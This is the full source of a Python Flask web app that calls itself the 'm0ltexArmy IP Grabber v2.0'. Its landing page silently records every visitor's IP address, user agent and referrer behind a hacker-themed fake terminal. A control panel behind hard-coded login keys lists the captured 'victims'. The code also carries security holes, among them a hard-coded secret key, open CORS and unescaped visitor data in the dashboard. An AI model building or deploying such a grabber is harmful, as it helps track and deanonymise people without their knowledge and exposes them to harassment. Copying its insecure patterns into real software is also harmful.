from flask import Flask, request, session, redirect
from flask_socketio import SocketIO, emit
import sqlite3
import os
import hashlib
import user_agents  # pip install user-agents

app = Flask(__name__)
app.secret_key = "m0ltex_final_secret_2026"
socketio = SocketIO(app, cors_allowed_origins="*")

# ======================
# DATABASE
# ======================
def init_db():
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS visits (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip TEXT,
                    user_agent TEXT,
                    referrer TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )""")
    
    c.execute("""CREATE TABLE IF NOT EXISTS unique_visits (
                    ip TEXT PRIMARY KEY,
                    first_visit DATETIME,
                    last_visit DATETIME,
                    visits INTEGER DEFAULT 1,
                    user_agent TEXT
                )""")
    conn.commit()
    conn.close()

init_db()

# ======================
# HELPER - REAL IP
# ======================
def get_real_ip():
    headers = ['CF-Connecting-IP', 'X-Forwarded-For', 'X-Real-IP', 'True-Client-IP', 'X-Client-IP']
    for header in headers:
        ip = request.headers.get(header)
        if ip:
            return ip.split(',')[0].strip()
    return request.remote_addr

# ======================
# HOME - IP GRABBER
# ======================
@app.route("/")
def home():
    ip = get_real_ip()
    ua_string = request.headers.get('User-Agent', 'Unknown')
    referrer = request.headers.get('Referer', 'Direct')
    
    ua = user_agents.parse(ua_string)
    
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    
    c.execute("INSERT INTO visits (ip, user_agent, referrer) VALUES (?, ?, ?)",
              (ip, ua_string, referrer))
    
    c.execute("""INSERT INTO unique_visits (ip, first_visit, last_visit, visits, user_agent)
                 VALUES (?, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, ?)
                 ON CONFLICT(ip) DO UPDATE SET 
                 last_visit = CURRENT_TIMESTAMP, visits = visits + 1""", 
                 (ip, ua_string))
    
    conn.commit()
    conn.close()

    return """
<html>
<head>
<title>m0ltexArmy</title>
<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<style>
    body { margin:0; background:black; color:#0f0; font-family:monospace; overflow:hidden; }
    canvas { position:fixed; top:0; left:0; z-index:0; }
    .sidebar { width:240px; height:100vh; background:#0a0a0a; border-right:2px solid #f00; padding:20px; position:fixed; z-index:2; }
    .main { margin-left:260px; padding:30px; z-index:1; }
    #terminal { height:420px; background:#000; border:1px solid #f00; padding:15px; overflow:auto; box-shadow:0 0 25px #f00; }
    #cmd { width:100%; background:black; border:1px solid #f00; color:#0f0; padding:12px; font-family:monospace; margin-top:10px; }
    .red { color:#f00; text-shadow:0 0 8px #f00; }
</style>
</head>
<body>
<canvas id="rain"></canvas>
<div class="sidebar">
    <h1 class="red">ᴍ𝟘ʟᴛᴇ𝔁𝔸𝕣𝕞𝕪</h1>
    <a href="/login" style="color:#0f0; text-decoration:none;">→ Login</a>
</div>
<div class="main">
    <h1 class="red">REALTIME TERMINAL v2.0</h1>
    <p>Online: <span id="online">0</span> | Victims logged: <span id="victims">0</span></p>
    <div id="terminal"></div>
    <input id="cmd" placeholder="Type /help ...">
</div>

<script>
var socket = io();
let term = document.getElementById("terminal");

socket.on("message", msg => {
    term.innerHTML += msg + "<br>";
    term.scrollTop = term.scrollHeight;
});

socket.on("online", count => document.getElementById("online").innerText = count);

document.getElementById("cmd").addEventListener("keypress", e => {
    if (e.key === "Enter") {
        let cmd = e.target.value.trim();
        if (cmd) socket.emit("command", cmd);
        e.target.value = "";
    }
});

// Matrix Rain
const c = document.getElementById("rain");
const ctx = c.getContext("2d");
c.height = window.innerHeight;
c.width = window.innerWidth;
const chars = "01アイウエオカキクケコ01ハンドル".split("");
const fontSize = 14;
const columns = c.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, c.width, c.height);
    ctx.fillStyle = "#f00";
    ctx.font = fontSize + "px monospace";
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > c.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 35);
window.addEventListener("resize", () => location.reload());
</script>
</body>
</html>
"""

# ======================
# LOGIN
# ======================
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        key = request.form.get("key")
        if key:
            hashed = hashlib.sha256(key.encode()).hexdigest()
            if hashed == hashlib.sha256("founder".encode()).hexdigest():
                session["role"] = "founder"
                return redirect("/dashboard")
            elif hashed == hashlib.sha256("staff".encode()).hexdigest():
                session["role"] = "staff"
                return redirect("/dashboard")
    return """
    <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px;">
    <h1 class="red">m0ltexArmy - LOGIN</h1>
    <form method="post">
        <input type="text" name="key" placeholder="ENTER KEY" style="padding:12px;width:300px;background:#111;border:1px solid #f00;color:#0f0;"><br><br>
        <button style="padding:10px 30px;background:#f00;color:black;border:none;cursor:pointer;">ACCESS</button>
    </form>
    </body>
    """

# ======================
# DASHBOARD
# ======================
@app.route("/dashboard")
def dashboard():
    if "role" not in session:
        return redirect("/login")
    
    conn = sqlite3.connect("data.db")
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM visits"); total = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM unique_visits"); unique = c.fetchone()[0]
    c.execute("SELECT ip, user_agent, referrer, timestamp FROM visits ORDER BY timestamp DESC LIMIT 50")
    logs = c.fetchall()
    conn.close()

    logs_html = "<br>".join([f"<b>{ip}</b> | {time} | {ua[:60]}..." for ip, ua, ref, time in logs])
    
    return f"""
    <body style="background:black;color:#0f0;font-family:monospace;padding:20px;">
    <h1 class="red">m0ltexArmy CONTROL PANEL</h1>
    <p>Total grabs: {total} | Unique victims: {unique}</p>
    <a href="/logout">Logout</a> | <a href="/export">Export CSV</a>
    <hr>
    <h2>Last 50 grabs:</h2>
    <div style="background:#111;padding:15px;border:1px solid #f00;">
        {logs_html}
    </div>
    </body>
    """

@app.route("/export")
def export():
    if "role" not in session: return redirect("/login")
    return "Export coming soon..."

# ======================
# SOCKETIO
# ======================
online_users = 0

@socketio.on("connect")
def handle_connect():
    global online_users
    online_users += 1
    emit("online", online_users, broadcast=True)

@socketio.on("disconnect")
def handle_disconnect():
    global online_users
    online_users = max(0, online_users - 1)
    emit("online", online_users, broadcast=True)

@socketio.on("command")
def handle_command(cmd):
    role = session.get("role", "guest")
    if cmd == "/help":
        emit("message", "Commands: /help | /info | /clear | /stats")
    elif cmd == "/info":
        emit("message", f"Role: {role} | Online: {online_users}")
    elif cmd == "/clear":
        emit("message", "<span style='color:#f00;'>Terminal cleared.</span>")
    elif cmd == "/stats":
        emit("message", f"Total victims: {online_users}")
    else:
        emit("message", f"Unknown command: {cmd}")

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/")

# ======================
# RUN
# ======================
if __name__ == "__main__":
    print("✅ m0ltexArmy IP Grabber v2.0 - Started")
    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 10000)), debug=False)
